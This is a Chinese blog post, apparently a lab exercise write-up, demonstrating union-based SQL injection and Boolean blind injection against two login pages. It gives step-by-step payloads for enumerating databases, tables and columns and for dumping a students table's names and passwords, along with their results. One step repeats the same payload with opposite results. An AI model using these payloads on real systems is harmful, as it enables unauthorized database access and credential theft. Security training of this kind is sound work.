---
title: 联合注入攻击
categories: 
- 渗透测试
tags: 
- 漏洞复现
- SQL注入
- WEB安全
comments: true
---



# 任务1------对http://yun.xxxxx.com:40008/login.html进行联合注入攻击

步骤如下：

- 判断注入点是否存在
- 判断字段
- 判断输出位置
- 爆库名
- 爆表名
- 爆字段名
- 获取students表中的数据

<!-- more -->

## 1.判断注入点是否存在
	步骤如下：
		1.在用户名栏输入1'				// 报数据库查询出错
		2.在用户名栏输入1' or 1=1 -- 	// 正常登陆
		3.在用户名栏输入1' or 1=2 --	// 出错
	由此判断该处user参数为注入点
## 2.判断字段
	步骤如下：
		1.在用户名栏输入1' or 1=1 order by 1 -- 	//登陆成功
		2.在用户名栏输入1' or 1=1 order by 2 --		//登陆成功
		3.在用户名栏输入1' or 1=1 order by 3 --		//登陆成功
		4.在用户名栏输入1' or 1=1 order by 4 --		//报数据库查询出错
	由此判断字段数为3
## 3.判断输出位置
	步骤如下：
		1.在用户名栏输入1'  union select 1,2,3 -- //页面输出一个二
	由此判断输出位置为2
## 4.爆库名
	步骤如下：
		1.在用户名栏输入1' union select 1,database(),3 -- //输出数据库名为grade
	*******************************************************************************
	*******************************************************************************
	*******************************************************************************
	以下步骤因为输入框存在输入长度限制，且http请求方式为post方式，因此使用了火狐插件tamperdata进行抓包以及修改post请求参数。
## 5.爆表名
	步骤如下：
		1.在tamperdata输入1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='grade'),3-- 
		//成功爆出表名为admins,classes,english,networks,students,teachers
## 6.爆字段名
	步骤如下：
		1.在tamperdata输入1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='students'),3-- 	
		//成功爆出字段名为id,name,pass
## 7.获取students表中的数据
	步骤如下：
		1.在tamperdata输入1' union select 1,(select group_concat(id,name,pass) from grade.students),3 -- 
		//成功爆出数据为
		3001yizyi001,
		3002erzer002,
		3003sanzsan003,
		3004sizsi004,
		3005wuzwu005,
		3006liuzliu006,
		3007qizqi007,
		3008bazba008,
		3009jiuzjiu009,
		3010shizshi010
# 拓展任务------对http://yun.zhiliaotang.com:40006/userlogin.php 进行sql盲注（基于布尔的盲注）
步骤如下：
## 1.判断注入点是否存在，是字符型还是数字型
	步骤如下：
	1.在用户名栏输入1'							//提示登陆失败
	2.在用户名栏输入1' or 1=1#					//登陆成功
	3.在用户名栏输入1' or 1=2#					//提示登陆失败
	由此判断该处存在典型的sql盲注，且是字符型。
## 2.猜解当前数据库名称长度
	步骤如下：
	1.在用户名栏输入1' or length(database())=1 #
	2.在用户名栏输入1' or length(database())=2 #
	3.在用户名栏输入1' or length(database())=3 #
	4.在用户名栏输入1' or length(database())=4 #
					`
			登陆	`	失败
					`
					`
	9.在用户名栏输入1' or length(database())=9 #	登陆成功
	由此判断当前数据库名称长度为9.
## 3.猜解当前数据库名（这里采用二分法猜解数据库名）
	1.在用户名栏输入1' or ascii(substr(database(),1,1))>97#	登陆成功
	2.在用户名栏输入1' or ascii(substr(database(),1,1))<97#	登陆失败
	3.在用户名栏输入1' or ascii(substr(database(),1,1))>110#登陆失败
	4.在用户名栏输入1' or ascii(substr(database(),1,1))<110#登陆成功
	5.在用户名栏输入1' or ascii(substr(database(),1,1))>103#登陆失败
	6.在用户名栏输入1' or ascii(substr(database(),1,1))<103#登陆失败
	说明当前数据库的第一个字母为g
	重复上述步骤可以获取到完整的数据库名称为guestbook
	*******************************************************************************
	*******************************************************************************
	*******************************************************************************
	以下步骤因为输入框存在输入长度限制，且http请求方式为post方式，因此使用了火狐插件tamperdata进行抓包以及修改post请求参数。
## 4.猜解数据库中的表名
	4.1首先猜解数据库中表的数量：
		4.1.1.在用户名栏输入1’ or (select count (table_name) from information_schema.tables where table_schema=database())=1 # //登陆失败
		4.1.2.在用户名栏输入1’ or (select count (table_name) from information_schema.tables where table_schema=database())=1 # //登陆成功
		说明当前数据库有两个表
	4.2接着猜解每个表的名称（任然使用二分法）
		4.2.1.猜解表的表长度
			1).在用户名栏输入1’ or length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1# 登陆失败
			重复上述步骤，获得表的长度为7和4
		4.2.2.猜解表名（二分法）
			1).在用户名栏输入1’ or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #登陆成功
			重复上述步骤可以获取到完整的表名为message和user
## 5.猜解表中的字段名
	和猜解表明类似，不再赘述。